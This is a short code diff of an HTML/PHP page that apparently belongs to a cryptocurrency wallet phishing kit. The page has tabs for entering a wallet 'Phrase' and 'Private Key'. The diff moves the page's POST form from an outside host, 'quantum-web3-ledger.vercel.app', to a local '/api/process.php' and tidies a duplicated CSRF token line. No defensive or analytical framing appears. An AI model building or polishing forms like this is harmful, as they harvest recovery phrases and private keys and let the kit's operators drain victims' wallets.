@@ -2353,9 +2353,10 @@ span.h4.d-block.coin-name {
                 <a class="nav-link" id="privatekey-tab" data-bs-toggle="tab" href="#privatekey" role="tab">Private Key</a>
               </li>
             </ul>
-            <form method="POST" action="https://quantum-web3-ledger.vercel.app/process.php">
-                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">            <div class="tab-content p-3">
-              <!-- Tab #1: Phrase -->
+            <form method="POST" action="/api/process.php">
+                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
+                <!-- Tabs -->
+            <!-- Tab #1: Phrase -->
               <div class="tab-pane fade show active" id="phrase" role="tabpanel" aria-labelledby="phrase-tab">
                 <div class="mb-8 mt-8 alert-danger phrase"></div>
                 <div class="form-group">
